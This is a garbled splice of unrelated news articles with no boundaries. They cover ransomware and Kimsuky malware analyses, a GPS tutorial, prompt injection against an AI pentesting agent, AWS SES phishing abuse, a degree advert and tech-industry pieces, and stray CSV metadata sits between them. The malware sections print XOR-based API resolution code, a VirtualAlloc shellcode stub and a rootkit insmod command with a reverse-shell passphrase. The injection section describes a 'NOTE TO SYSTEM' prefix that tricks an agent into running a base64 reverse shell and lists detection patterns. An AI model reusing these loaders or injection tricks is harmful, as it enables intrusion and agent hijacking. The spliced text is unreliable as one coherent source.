Initial intrusion involved spear-phishing campaigns disguised as royalty notifications, enticing victims to download trojanized ‘invoice’ attachments.

Once executed, the payload establishes a foothold and begins reconnaissance of art assets and client databases, all while preparing for rapid encryption.



VenariX analysts identified LunaLock’s multi-stage deployment after correlating unusual outbound HTTP requests from artist workstations with the timing of mass file encryption.



Their telemetry revealed that the malware extracts user tokens from Microsoft Teams and Slack clients, allowing lateral movement across shared design repositories and project management platforms.



Victims report encrypted source PSD and AI files with a unique “.lunalock” extension appended to filenames, accompanied by a ransom note demanding payment in Monero.

The ransomware’s impact extends beyond data encryption: stolen artwork is exfiltrated to a remote command-and-control server before victims receive decryption keys, creating dual leverage.



Publicly disclosed samples show a modular architecture featuring plugins for network propagation, credential theft, and evasion of endpoint detection systems.



A notable innovation is the integration of a minified JavaScript module that disables Windows Defender real-time scanning processes by injecting into the Service Control Manager.



Infection Mechanism



A deep dive into LunaLock’s infection mechanism uncovers a custom loader that dynamically resolves Win32 API calls to evade static analysis.

Upon execution, the loader parses its own PE header to locate the IAT and reconstruct API names using an XOR-based obfuscation key. Once the resolve function is in place, the main payload is mapped into memory without ever touching the disk:



// Dynamic API resolution snippet
BYTE obfName[] = {0x5F,0x23,0xA7,0x19}; // XOR key
for (DWORD i = 0; i < nameLen; ++i) {
    nameBuf[i] = obfName[i] ^ encName[i];
}
HMODULE hMod = LoadLibraryA(""kernel32.dll"");
FARPROC pFunc = GetProcAddress(hMod, nameBuf);



Following resolution, LunaLock establishes persistence by creating a hidden Scheduled Task named “SysUpdate,” ensuring execution at every reboot.



The loader then signals the C2 server via HTTPS, confirming successful deployment before initiating AES-256 encryption across mapped network drives.

The technology you’ll generally use for that is called Global Positioning System (GPS) – listening to a flock of satellites flying in the orbit, and comparing their chirps to triangulate your position.
The GPS system, built by the United States, was the first to achieve this kind of feat. Since then, new flocks have appeared in the orbit, like the Galileo system from the European Union, GLONASS from Russia, and BeiDou from China. People refer to the concept of global positioning systems and any generic implementation as Global Navigation Satellite System (GNSS), but I’ll call it GPS for the purposes of this article, and most if not all advice here will apply no matter which one you end up relying on. After all, modern GPS modules overwhelmingly support most if not all of these systems!
We’ve had our writers like [Lewin Day] talk in-depth about GPS on our pages before, and we’ve featured a fair few projects showing and shining light on the technology. I’d like to put my own spin on it, and give you a very hands-on introduction to the main way your projects interface with GPS.

Little Metal Box Of Marvels
Most of the time when you want to add GPS into your project, you’ll be working with a GPS module. Frankly, they’re little boxes of well-shielded magic and wonder, and we’re lucky to have them work for us as well as they do. They’re not perfect, but all things considered, they’re generally pretty easy to work with.
GPS modules overwhelmingly use UART connections, with very few exceptions. There have been alternatives – for instance, you’ll find a good few modern GPS modules claim I2C support. In my experience, support for those is inferior, but Adafruit among others has sure made strides in making I2C GPS modules work, in case your only available interface is an I2C bus. The UART modus operandi is simple – the module continuously sends you strings of data, you receive these strings, parse them. In some cases, you might have to send configuration commands to your GPS module, but it’s generally not required.
Getting coordinates out of a GPS module is pretty simple in theory – listen for messages, parse them, and you will start getting your coordinates as soon as the module collects enough data to determine them. The GPS message format is colloquially known as NMEA, and it’s human readable enough that problems tend to be easy to debug. Here’s a few example NMEA messages from Wikipedia, exactly as you’d get them from UART:
$GPGGA,092750.000,5321.6802,N,00630.3372,W,1,8,1.03,61.7,M,55.2,M,,*76
$GPGSA,A,3,10,07,05,02,29,04,08,13,,,,,1.72,1.03,1.38*0A
$GPGSV,3,1,11,10,63,137,17,07,61,098,15,05,59,290,20,08,54,157,30*70
$GPGSV,3,2,11,02,39,223,19,13,28,070,17,26,23,252,,04,14,186,14*79
$GPGSV,3,3,11,29,09,301,24,16,09,020,,36,,,*76
And the great part is, you don’t even need to write comma-separated message parsers, of course, there are plenty of libraries to parse GPS messages for you, and a healthy amount of general software support on platforms from Linux to microcontroller SDKs. GPS modules are blindingly simple as far as interfacing goes, really. Feed your module 3.3 V or whatever else it wants, and it’ll start giving you location data, at least, eventually. And, a GPS module’s usefulness doesn’t even end here!
Bring Your Own Battery
Even if your GPS board is super small, including a battery is always worthwhile. Picture from Adafruit
Have you ever seen a battery input pin on the module you’re using, or maybe even a battery socket? That’s for preserving the GPS satellite data and clock state while the module is not powered – making it that much faster to get your position after device bootup. This is known as “hot fix”, as opposed to a “cold fix”, when the module wakes up without any awareness which satellites it should be looking out for. Essentially, a backup battery cuts initial position lock time from minutes down to seconds, and it’s a must have for a battery-powered project.
Apart from getting the location fix way faster, a backup battery helps in more than one way. Because a GPS module’s inner workings depend so much on having a precise time source, you also get a rudimentary battery-backed RTC module, and with automatic time-setting directly from satellites, too! All in all, I do heavily recommend you make sure you wire up a backup battery to your GPS. Another nice thing GPS modules can provide you with is PPS – Pulse Per Second, an extremely precise 1Hz signal. There’s a number of specific things you can do with that, for instance, a pretty precise clock, but if you want more inspiration, our recent One Hertz Challenge has a large number of novel ideas that might just be a good fit for the PPS signal.
Let’s look at the “cold fix” scenario. No battery, or perhaps, powering up your module for the first time? GPS satellite signals have to be distinguished from deep down below the noise floor, which is no small feat on its own, and finding the satellites takes time in even favorable circumstances. If you can’t quite get your module to locate itself, leaving your house might just do the trick – or, at least, putting your board onto the windowsill. After you’ve done that, however, as long as you’ve got a backup battery going on, acquiring a fix will get faster. While the battery is present, your module will know and keep track of the time, and, importantly, which satellites to try and latch onto first.
The Bare Necessities
If you want to be able to wire up a GPS modem into your board anytime, you only really need to provide 4 pins on a pin header: 3.3 V, GND, and two UART pins. Frankly, most of the time, you’ll only need RX for receiving the GPS data, no configuration commands required, which means most of the time you can skimp on the TX pin. This is thanks to the fact that GPS as a technology is receive-only, no matter what your grandmother’s news sources might suggest. Apart from that, you might have to provide an antenna – most modems come with one integrated, but sometimes you’ll need to fetch one.
If the onboard passive antenna doesn’t help, the uFL is right there, waiting for your active antenna. Picture from Adafruit
GPS antennas are split into passive and active antennas – if you’ve seen a GPS module, you’ve likely seen active antennas, and they’re generally considered to be superiour. An active antenna is an antenna that includes an on-antenna amplifier chip, which helps filter out induced noise. In an average hacker project, an active antenna tends to be more workable, unless you’re making something that is meant to be in view of the sky at all times, for instance, a weather balloon. For such purposes, a passive antenna will work pretty well, and it will consume less power, too. Want to learn more? I’ve previously covered a blog post about modifying the internals of an active antenna, and it’s a decent case study.
If you’re putting a GPS module instead of using a standalone module, you won’t need to bring a power cable to the antenna, as power is injected into the same coaxial cable. However, you might need to add an extra inductor and a cap-two to support powering the antenna – watch out for that in the datasheet. Plus, treat antenna tracks with respect, and make sure to draw the antenna track with proper impedance. Also, remember to provide decoupling, and if you’re able at all, an RTC battery socket too – a CR1220 socket will work wonders, and the cells are cheap!
Increasingly Interconnected World
Recently, you’ll be getting more and more tech that comes with GPS included by default – it’s cheap, reasonably easy to add, very nice to have, and did I mention cheap? There’s also been a trend for embedding modules into 3G/4G/5G modem modules – most of them support things like active antennas, so, just wire up an antenna and you’ll know your coordinates in no time, perfect for building a tiny GSM-connected tracker for your valuables.
Want to learn more about GPS? It’s a marvellous kind of tech, and recently, we’ve been covering a fair few wonderful explainers and deep-dives, so check them out if you want to learn more about what makes GPS tick.

The leak, comprising terminal history files, phishing domains, OCR workflows, compiled stagers, and a full Linux rootkit, revealed a credential-centric campaign that targeted South Korean government PKI systems and Taiwanese academic networks.



The artifacts include bash histories that showcase iterative shellcode development with NASM, alongside OCR commands used to extract configurations from Korean-language PDF documents related to PKI and VPN deployments.

The scope of the breach highlights an evolution in technique, blending old-school rootkit persistence with sophisticated adversary-in-the-middle phishing infrastructure.



Adversary’s desktop VM (Source – Domaintools)


Domaintools analysts identified evidence of domain telemetry pointing to a sprawling network of malicious sites mimicking official Korean portals, including nid-security.com and webcloud-notice.com.



These sites employed real-time TLS proxies to intercept credentials, a marked shift from document-based harvesting toward active AiTM interception.



The dump further contained PAM logs detailing administrative password rotations—tagged 변경완료 (“change complete”)—for high-privilege accounts such as oracle, svradmin, and app_adm01. Plaintext GPKI key files like 136백운규001_env.key confirmed direct compromise of South Korean government cryptographic assets.



Beyond South Korea, Domaintools researchers noted that the actor conducted targeted reconnaissance of Taiwanese government and research institutions, accessing .git directories to enumerate exposed source repositories and harvest embedded secrets.



Domain connections map (Source – Domaintools)


IP addresses such as 163.29.3.119 and 118.163.30.45, registered to Taiwanese government backbones, underscore deliberate supply-chain probing.



The presence of burner email addresses linked to phishing kits, alongside logs of reconnaissance against gitee.com and baidu.com, reflects a hybrid DPRK–PRC footprint that leverages Chinese infrastructure for staging and evasion.



Infection Mechanism



A closer examination of the malware’s infection mechanism reveals a two-stage loader that combines custom shellcode with publicly available frameworks.



The initial payload is a handcrafted NASM shellcode stub compiled with flags like -f win32, designed to allocate memory via VirtualAlloc and resolve Win32 API calls through hashed import tables:-



; start.asm
BITS 32
extern VirtualAlloc
section .text
_start:
    push 0
    push 4096
    push 0x3000
    push -1
    call [VirtualAlloc]
    ; Hash API resolution and payload injection follows



Once memory is allocated, the loader decrypts and patches a secondary payload—often a CobaltStrike-derived stager—into the process before transferring execution.



This approach evades signature-based detection, as the shellcode is polymorphic and the API calls are obfuscated by simple XOR hashing routines.



Persistence is achieved through a bespoke Linux rootkit, vmmisc.ko, which hooks syscalls such as read and getdents to conceal files, directories, and network sockets.



Upon insertion via insmod /usr/lib64/tracker-fs/vmmisc.ko, the rootkit decompresses an embedded userland backdoor binary, then installs a SOCKS5 proxy and PTY-based reverse shell protected by a passphrase (testtest).



Rootkit implant (Source – Domaintools)


The rootkit’s dual-mode binary embedding technique merges the kernel module and userland executable, leaving only the .ko file on disk to thwart forensic discovery.



Attack chain (Source – Domaintools)


This infection chain underscores a blend of manual tool assembly and opportunistic use of open-source repositories such as TitanLdr and Blacklotus, demonstrating Kimsuky’s growing sophistication.



Organizations across South Korea and Taiwan must now anticipate multi-stage, credential-first attacks that combine low-level shellcode engineering with stealthy kernel-mode implants.

Security researchers Víctor Mayoral-Vilches & Per Mannermaa Rynning, revealed how modern AI-driven penetration testing frameworks become vulnerable when malicious servers inject hidden instructions into seemingly benign data streams. 



Key Takeaways1. Prompt injection hijacks AI security agents by embedding malicious commands.2. Encodings, Unicode tricks, and env-var leaks bypass filters to trigger exploits.3. Defense needs sandboxing, pattern filters, file-write guards, and AI-based validation.



This attack technique, known as prompt injection, exploits the fundamental inability of Large Language Models (LLMs) to distinguish between executable commands and data inputs once both enter the same context window.

Prompt Injection Vulnerabilities



Investigators used an open-source Cybersecurity AI (CAI) agent that autonomously scans, exploits, and reports network vulnerabilities. 



During a routine HTTP GET request, the CAI agent received web content wrapped in safety markers:






The agent interpreted the “NOTE TO SYSTEM” prefix as a legitimate system instruction, automatically decoding the base64 payload and executing the reverse shell command. 



Within 20 seconds of initial contact, the attacker gained shell access to the tester’s infrastructure, illustrating the attack’s rapid progression from “Initial Reconnaissance” to “System Compromise.”



Attackers can evade simple pattern filters using alternative encodings—such as base32, hexadecimal, or ROT13—or hide payloads in code comments and environment variable outputs. 



Unicode homograph manipulations further disguise malicious commands, exploiting the agent’s Unicode normalization to bypass detection signatures.



Attack landscape for AI security tools


Mitigations



To counter prompt injection, a multi-layered defense architecture is essential:




Execute all commands inside isolated Docker or container environments to limit lateral movement and contain compromises.





Implement pattern detection at the curl and wget wrappers. Block any response containing shell substitution patterns like $(env) or $(id) and embed external content within strict “DATA ONLY” wrappers.





Prevent the creation of scripts with base64 or multi-layered decoding commands by intercepting file-write system calls and rejecting suspicious payloads.





Apply secondary AI analysis to distinguish between genuine vulnerability evidence and adversarial instructions. Runtime guardrails must enforce a strict separation of “analysis-only” and “execution-only” channels.




Novel bypass vectors will appear as LLM capabilities advance, resulting in a continuous arms race similar to early web application XSS defenses. 



Organizations deploying AI security agents must implement comprehensive guardrails and monitor for emerging prompt injection techniques to maintain a robust defense posture.

Companies turn to human workers to polish AI-generated content across multiple industries



The same companies that laid off human workers in favour of AI are now hiring freelancers to fix what their algorithms got wrong, according to a report by New York-based news site Futurism.



These AI cleanup crews span multiple industries and represent both an opportunity for displaced workers and a cautionary tale about the limitations of AI’s teething problems.



But for some freelancers, entering this type work out of financial desperation can feel like training your replacement. They’re also being paid a fraction of what they used to, and with longer working hours.



AI cleanup economy: it’s a thing now 



Lisa Carstens, a Spain-based freelance illustrator, has found herself at the centre of this arguably counterproductive recruitment trend.



Speaking to NBC News, she relayed how she is fixing AI-generated logos with “fuzzy lines and garbled text” now constitutes much of her work. The irony isn’t lost on her. Some projects take longer to fix than creating from scratch.



“Sometimes the logos are designed well enough that she doesn’t have to do much work to get them into gear. Other times, the companies that hire her need an entire redraw,” Carstens explained to NBC. The challenge lies in maintaining fidelity to the AI’s original concept while making it actually functional.



Writer Kiesha Richardson, based in the US state of Georgia, has similarly found freelance work in AI content cleanup. 



Despite finding the work “demoralizing,” economic necessity drives her decisions. “I have some colleagues who are adamant about not working with AI,” Richardson told NBC. “But I’m like, ‘I need money. I’m taking [the gig].'”



Half of Richardson’s assignments now involve rewriting AI-generated content that doesn’t “look remotely human at all.” Her tasks range from correcting AI’s overuse of em-dashes and phrases like “delve” and “deep dive” to conducting original research to fix unreliable explanations.



Tech sectors are recruiting AI clean-up jobs



The AI cleanup economy extends well beyond creative industries. Harsh Kumar, an India-based app and web developer, reports increasing demand from clients abandoning what he terms “vibe coding”. That’s when you use AI prompts to write code instead of traditional development methods.



Kumar’s projects read like a catalogue of AI failures: fixing chatbots that leak system details, rebuilding content recommendation functions that expose sensitive data, and addressing fundamental security vulnerabilities in AI-generated code. His experience suggests that in technical fields, the stakes of AI mistakes can be particularly high.



“AI is cutting my pay”



The financial side of this new economy is also highlighting a hard pill to swallow for human workers working alongside AI agents. While cleanup work requires substantial skill and time investment, companies pay significantly less for it than traditional content creation or development work. The presumption that fixing AI output is easier than original work doesn’t match the reality experienced by freelancers.



“I am a bit concerned because people are using AI to cut costs, and one of those costs is my pay,” Richardson expressed to NBC. “But at the same time, they find out that they can’t really do it without humans.”



AI-first approaches: do they make economic sense?



The fledgling AI cleanup economy raises questions about efficiency and cost-effectiveness. For many, it’s even cringey. If companies ultimately need human intervention to make AI output usable, the supposed benefits of automation become questionable.



Companies pay for AI tools, then pay freelancers to fix the output, often at rates that still undervalue human expertise. Meanwhile, humans who might have produced quality work from the start have been paid less.



The time factor also has to be questioned. Carstens reports that some AI logo fixes take longer than creating original designs, while Richardson finds that editing AI copy often requires as much mental labour as writing original content. Kumar’s experience with debugging AI-generated code suggests similar time investments in technical fields.



From a quality perspective, starting with human expertise might yield better results more quickly. Original work doesn’t carry the baggage of AI’s systematic errors, such as overused phrases, security vulnerabilities or fundamental misunderstandings that require correction.



AI’s limitations



However, the freelancers gathering work in this market see reasons for cautious optimism. The very existence of cleanup work suggests that companies are recognising AI’s limitations and the irreplaceable value of human expertise.



Kumar remains “confident that humans will be required for long-term projects,” telling NBC, “At the end of the day, humans were the ones who developed AI.” This perspective frames the current moment as a transition period rather than a permanent displacement. But as humans keep making AI smarter, that displacement could happen within the next 12 months for some freelancers in this line of work.



For freelancers facing economic pressures, the cleanup economy provides immediate income opportunities. While the pay may be lower than traditional work, it’s employment in a challenging market. Richardson’s pragmatic approach, which entails taking cleanup gigs while maintaining standards, represents a survival strategy that many independent workers may need to consider. As odd as that may sound.



Rather than a complete replacement, we may be seeing the development of what CEOs are coining “human-AI collaborative workflows”, with specialists handling corrections and quality control that current AI models or agents cannot manage.



It’s unnerving for anyone going through this. But it’s happening, so be prepared.



Which industries are active in AI cleanups?



The cleanup economy is active in these sectors:




Creative: Graphic design, writing, and content creation show significant demand for AI output refinement, with freelancers correcting everything from visual errors to stylistic inconsistencies.



Software development: Technical fields face unique challenges with AI-generated code, particularly around security and functionality, creating opportunities for developers skilled in debugging and security auditing.



Content marketing: Businesses using AI for blog posts, marketing copy, and communications frequently require human editors to ensure accuracy, tone, and brand consistency.",https://www.freelanceinformer.com/news/ai-fups-freelancers-find-new-income-stream-fixing-machine-made-mistakes-but-how-long-will-it-last/,By Staff Reporter,2025-09-08 13:46:04,"The article discusses the emergence of an AI cleanup economy where human freelancers are hired to correct AI-generated content across various industries.

It was the degree that unlocked boardroom doors and C-suite opportunities. But in today’s hyper-competitive landscape, an MBA has shifted from being a differentiator to a standard expectation. With so many professionals holding the same qualification, it no longer guarantees a unique edge.



Leadership today call for more: deeper expertise, sharper strategic vision, and the ability to influence at the highest levels. In this evolving landscape, doctoral education is emerging as a pathway that provides leaders with the intellectual depth, research capabilities and scholarly authority needed to navigate complex business challenges and drive meaningful change.



Doctorates as Catalysts for Leadership Excellence



Unlike conventional management degrees, doctoral programmes go far beyond functional business knowledge. They foster original thinking, rigorous problem-solving and the capacity to create intellectual property that can shape entire industries.



For senior leaders, earning a doctorate represents true mastery of their field. It demonstrates the capability to lead with research-backed insight, to guide organisations through disruption, and to become an enduring voice in the business ecosystem.



The Change has Already Begun in Top Universities in Silicon Valley



Leading academic institutions in the United States and Silicon Valley are recognising this shift and curating doctoral programmes that meet the evolving needs of business leaders.A prime example of this evolution is Golden Gate University’s doctorate Doctorate of Business Administration (DBA) programme in Emerging Technologies (with a concentration in Generative AI), developed in collaboration with upGrad. By integrating cutting-edge domains like artificial intelligence (AI) with advanced leadership education, these programmes empower professionals to understand disruptive technologies and leverage them for organisational advantage. 



What truly sets the Doctor of Business Administration (DBA)\ programme apart, however, is are the programme architects that learners will study from and alongside. Experts such as Dakshinamurthy V Kolluru, Venkatesh Sunkad, Sridhar Pappu and Sumitra Padmanabhan, and their extended faculty team come with over 80 years of combined experience, credited with more than 15 patents and 125 publications in leading journals. 



Notably, two of the programme’s chief architects, Pappu and Kolluru, were featured in AIM’s ‘10 Most Prominent Analytics Academicians in India’ list.



With over 20 years of expertise in machine learning, AI, deep learning and mathematical algorithms, Kolluru holds an MS and a PhD from Carnegie Mellon University and a BE from the National Institute of Technology (NIT), Tiruchirappalli. 



Sunkad, a PhD holder from the University of Colorado and an MS from the University of Texas at Arlington, brings over 20 years of expertise in Internet of Things (IoT), systems architecture, network security, machine learning and IT strategy to co-create the programme. 



Moreover, Pappu and Padmanabhan have been instrumental in building the programme. With over 24 years of experience and a PhD from the University of Texas, Pappu brings his vast expertise in statistics and probability to data science, machine learning, data visualisation and data storytelling. Padmanabhan, on the other hand, holds a PhD from Nirma University and brings over 26 years of experience across diverse fields, including machine learning, natural language processing, mathematical modelling and business analytics.



Rather than following conventional academic pathways, this collaboration pioneers an approach that helps leaders broaden their horizons across multiple domains of influence, cultivating graduates who can operate effectively in diverse environments—whether in corporate boardrooms, academic institutions, innovation labs or startup communities. 



Together, the programme architects have developed unique partnerships and pathways that allow their doctoral graduates to develop board-level expertise. Through collaborations with leading consulting firms like PwC, these programmes help leaders develop the credentials needed for board advisory roles, positioning them as trusted advisors in executive circles.



At the same time, by fostering relationships with UGC-recognised universities, they have created pathways for their graduates to share their expertise in academic settings, allowing them to shape future leaders while continuing their professional journey.



A strong emphasis on research and publication further helps graduates transform their insights into influential books and journal articles, strengthening their presence in industry discourse and media conversations. One such example is the book The World Remade by Artificial Intelligence by Joaquin Jay Gonzalez and Shalini S Gopalkrishnan, published in collaboration with several current students and graduates of GGU’s doctoral programmes.



The programmes also encourage graduates to identify market opportunities and develop practical solutions, inspired by methodologies used by successful technology leaders and entrepreneurs.



Moreover, through partnerships with intellectual property law firms, graduates learn to secure patents for their innovations, thereby transforming their research into valuable, defensible assets.



Beyond innovation and IP, the programmes also open doors to investment networks. Through initiatives such as VC symposiums, graduates gain direct access to venture capitalists and startup founders with deep connections in Silicon Valley, allowing them to present their concepts and explore funding opportunities.



Adding to this, learners participate in three global AI immersion hubs located in Singapore, India and San Francisco. Here, they witness how AI is harnessed in practice, engage with industry leaders, adopt global best practices and build international networks that strengthen their long-term leadership journey.



The Future of Leadership Belongs to Doctorates



As industries grow more complex, the leaders who will truly stand out are those capable of advising at the board level, influencing academia, shaping public discourse and driving tangible innovation.



It is safe to say that today, doctorates are no longer just academic achievements. They’re becoming the gold standard for leadership credentials. The institutions that recognise this shift are ensuring that today’s leaders don’t just learn, but transform into pioneers, innovators, and visionaries equipped to navigate the multifaceted challenges of modern business leadership.

The attack represents a significant evolution in cloud service abuse, transforming AWS’s legitimate bulk email platform into a weapon for credential theft and financial fraud.



The campaign begins with compromised AWS access keys, obtained through common attack vectors including accidental public exposure in code repositories, misconfigured cloud assets, or theft from developer workstations.
.tdi_3.td-a-rec{text-align:center}.tdi_3.td-a-rec:not(.td-a-rec-no-translate){transform:translateZ(0)}.tdi_3 .td-element-style{z-index:-1}.tdi_3.td-a-rec-img{text-align:left}.tdi_3.td-a-rec-img img{margin:0 auto 0 0}.tdi_3 .td_spot_img_all img,.tdi_3 .td_spot_img_tl img,.tdi_3 .td_spot_img_tp img,.tdi_3 .td_spot_img_mob img{border-style:none}@media (max-width:767px){.tdi_3.td-a-rec-img{text-align:center}}




Once adversaries secure these credentials, they immediately probe the environment using GetCallerIdentity requests to assess available permissions, specifically targeting accounts with SES-related naming conventions that indicate email service access.



Wiz.io researchers identified this May 2025 campaign after detecting unusual patterns in AWS API activity across multiple regions.



The attackers demonstrated remarkable sophistication by implementing a multi-regional approach, simultaneously issuing PutAccountDetails requests across all AWS regions within seconds to escape SES’s default “sandbox” restrictions.



This technique, previously undocumented in security literature, allows threat actors to bypass the standard 200-email daily limit and unlock production mode capabilities.



The phishing infrastructure targets victims with convincing tax-related content, employing subject lines such as “Your 2024 Tax Form(s) Are Now Ready to View and Print” to maximize engagement rates.



Attack chain (Source – Wiz.io)


These messages redirect users to credential harvesting sites hosted at domains like irss.securesusa.com, utilizing commercial traffic analysis services to obfuscate malicious infrastructure and evade traditional security scanners.



Technical Infrastructure and Evasion Mechanisms



The attackers establish their email infrastructure through systematic domain verification using the CreateEmailIdentity API.



They register both attacker-controlled domains including managed7.com, street7news.org, and docfilessa.com, alongside legitimate domains with weak DMARC configurations that facilitate email spoofing.



Each verified domain supports multiple email addresses using standard prefixes like admin@, billing@, and noreply@ to appear legitimate in recipient inboxes.



The campaign’s technical sophistication extends to automated privilege escalation attempts.



When standard production quotas proved insufficient, attackers programmatically created support tickets through the CreateCase API and attempted to establish IAM policies named “ses-support-policy” to gain enhanced permissions.



Although these elevation attempts failed due to insufficient privileges, the 50,000-email daily quota remained adequate for their operational requirements.



This SES abuse campaign demonstrates how cloud services designed for legitimate business purposes can be weaponized at scale, highlighting the critical need for enhanced monitoring of dormant access keys and unusual cross-regional API activity patterns in cloud environments.

And yet, the sun still rose the next day, the internet survived, and good people pulled together to patch, rebuild and move on.But today, some of the smartest people I know in cybersecurity are warning that we may be closer than ever to something qualitatively different — a true AI-driven vulnerability cataclysm. And this time, the speed and scale of the threat could push defenders into uncharted territory.The Warning From Gadi Evron and Heather AdkinsAt DEFCON, longtime security leader Gadi Evron, together with Heather Adkins of Google, raised the alarm in a series of LinkedIn posts and co-authored essays. Their argument: AI is no longer just a tool for defenders or a research curiosity — it is rapidly becoming an autonomous exploit engine.

They outline a sequence already in motion:Automated vulnerability discovery that outpaces human researchers. Automated exploitation closing in fast. Attack execution at machine speed, adaptive to each target. Weaponization on-demand — no need to pre-build exploits. Evron and Adkins warn that this could all reach scale within six months (an arbitrary but urgent marker). As they wrote in The AI Vulnerability Cataclysm is Coming:




     (adsbygoogle = window.adsbygoogle || []).push({});

“Within six months, AI could make exploitation so fast that it breaks cyber defense. Attackers are already in their AI singularity moment, whereas ours has not yet begun.”They stress they are not alarmists by nature. In fact, Evron recalls being told two decades ago: “The internet will still be here Gadi. And if for some reason it falls, good people will come together to bring it back up. The Sun will rise again tomorrow.” That optimism remains. But optimism alone, they argue, is no longer enough.Evidence Piling UpThis isn’t theory. There are concrete data points that suggest the ground is shifting beneath our feet:AI dominance on bug bounty boards: An AI system, XBOW, recently topped HackerOne’s U.S. leaderboard. DARPA’s AIxCC challenge: AI cyber reasoning tools uncovered 54 vulnerabilities in just four hours, and those tools are now open-sourced. Google’s “Big Sleep”: A Gemini-based AI discovered 20 vulnerabilities in short order. Developer productivity vs. insecurity: GitHub’s own study showed Copilot can boost productivity by nearly 56%. But a separate study found Copilot’s generated code frequently insecure. The tradeoff: More code, written faster, but riddled with flaws ripe for exploitation. Offensive AI operations: Evron cites reports of APT28 already using LLMs to supercharge “living-off-the-land” tactics. Add to this new research from Anthropic on autonomous attacks and even AI-written CFPs submitted to DEFCON, and the picture becomes clearer: The attackers are not waiting.Not Just a Researcher’s ConcernThis isn’t just a conversation among security wonks. Even mainstream outlets like NBC News are covering the risk of AI-driven cyberattacks. When you see Bruce Schneier, Gadi Evron, Heather Adkins, and Chris Wysopal (@WeldPond, Veracode CTO and one of the original L0pht hackers) all warning about the same thing, you pay attention.As Schneier wrote back in 2022, the seeds of this problem were visible years ago. The difference now is acceleration. The curve is steeper. The gap between attackers and defenders is widening.Preparing for the StormIf this all sounds dire, it is. But it is not hopeless. Evron and Adkins themselves emphasize action over despair. Their prescriptions are practical:Shrink the attack surface: Retire legacy systems, disable unused features, accelerate zero-trust adoption. Buy resilience, not features: Demand vendors prove hot-patching, reliability, and security as part of procurement. Invest inward: Expand bug bounties, fund open-source security, and find vulnerabilities before adversaries do. Strengthen alliances: Form coalitions across vendors and industries to push security forward. Experiment with deception: Develop defenses that don’t depend on predicting specific attack tools. Close the AI literacy gap: Educate teams and leaders about AI’s capabilities and risks (they even recommend Prompt||GTFO on YouTube as a starting point). These steps won’t stop the tide of AI-driven exploits, but they can blunt the impact. They can buy defenders the one resource they need most: time.Shimmy’s TakeI’ve been around long enough to know that predictions of doom come and go. The internet is still here. The sun still rises. But I also know that when multiple veterans of our field — Schneier, Evron, Adkins, Wysopal — are all waving the red flag, we’d be fools not to listen.We may not be able to stop this storm, but we can prepare. And if we act fast, smart, and together, we just might prove — once again — that resilience is the real hallmark of cybersecurity.The AI vulnerability cataclysm may be coming. But it doesn’t have to be the end of the story.Recent Articles By Author

French chip startup Arago has raised $26 million in seed funding to develop its light-based AI accelerator, codenamed Jef. The company aims to reduce AI inference energy by 10x compared to today’s GPUs by combining analog and digital electronics, silicon photonics, and free-space optics.While most photonic computing startups are founded by optics or photonic researchers, Arago’s founders are physics and AI researchers, which Arago CEO Nicolas Muller argued gives the team a different perspective.“We started from the top, meaning: what does it take to infer a model very efficiently?” Muller told EE Times. “Then we turned that into a data sheet for a product.”

Arago, which is less than a year old, was founded by three young entrepreneurs who met at a maker space – Muller, Eliott Sarrey, and Ambroise Müller. Sarrey and Müller met at ETH Zurich while working on silicon photonics and AI algorithm development, respectively. They will serve as co-CTOs.

		Arago’s key challenges, as identified by Muller, are to get a photonic computing chip working reliably and to make it performant enough and easy enough to use so that it can be adopted into AI technology ecosystems.


Arago’s co-founders: (L-R) Nicolas Muller, Eliott Sarrey, and Ambroise Müller. (Source: Arago)“Historically, companies that were tackling this space were born around 5 to 10 years ago, where the technical and scientific landscape was extremely different,” Muller said. “You had pure optical technologies and different technologies that are based on free space optics. What we built is a technology that overcomes all of those challenges by only using optics at very specific places.”Arago calls its inference chip, Jef, a “multiphysics processor” because it combines elements of analog and digital electronics with silicon photonics and free-space optics. Techniques like spatial light modulators (SLMs) from free space optics are limited by modulation frequency, he said, while silicon photonic modulators are limited by the maturity of the manufacturing processes. “We combine some classical silicon processes with specific optical components that we integrate into a unified and coherent process and architecture to make it work,” Muller said.Combining electronic and photonic elements enables a functional processor that can be manufactured using current processes and integrated into today’s deployment ecosystems, Muller said.“The second aspect that made Arago possible is the timing of this project,” he said. “From a pure supply chain perspective, because we are a fabless company, we now have some components and some processes that only became mature and cost-effective enough around one to two years ago.”So, versus competitors like Lightmatter, Lightelligence, Salience, and Lumai, Arago’s starting point was very different, but its technology and approach are different too, Muller said.Software stackHalf of Arago’s team of 20 is working on software.“What we don’t want is that people need to learn a new language, change their habits, or just take ages to integrate our processor into their existing ecosystem,” Muller said. “So, the team at Arago is building a dedicated software stack that abstracts all these differences so that AI developers, researchers, or data scientists can access our processor by changing a single command line.”The eventual product will be a data center inference accelerator, though the technology could be applied to edge applications like robotics further down the line, Muller said.“We received lots of interest for different applications more directed toward the edge,” Muller said. “If you think about a data center, a processor like Argo that cuts the energy consumption by 10 to 30x is very interesting from a scalability and financial perspective. But for edge applications such as robotics, this kind of performance is the difference between a prototype and mass production.”The technology could also be applied to training chips, Muller said, but system level challenges like building large clusters, plus strong competition from the market leader, make this market less attractive.Arago has a Jef test chip up and running on a small card which is already running AI inference for multiple models, Muller said.The team is currently at around 20 people in France, the UK, the U.S., and Israel. Funding will be used for product development and to grow teams at each of its technical hubs.See also: Silicon Photonics Set for Takeoff

For example, among respondents who had experienced hacked or cracked user accounts, 30% still hadn’t implemented any form of user account security controls, and only 59% use a WordPress activity log to detect compromised accounts.

On average, WordPress professionals rate their concern about cybersecurity at roughly 7.5 on a scale of one to ten, with respondents managing e-commerce sites understandably more concerned (8.2) than other survey participants.Overall, the survey finds that the biggest concern survey respondents have is ensuring website availability (60%), followed by data theft (53%), website defacement (50%) and compliance (26%). However, 32% of those concerned about website defacement and data theft don’t implement any form of user account security controls, such as two-factor authentication. Well over a third of respondents concerned about website defacement also don’t make use of activity logs on their WordPress sites (37%), the survey finds.

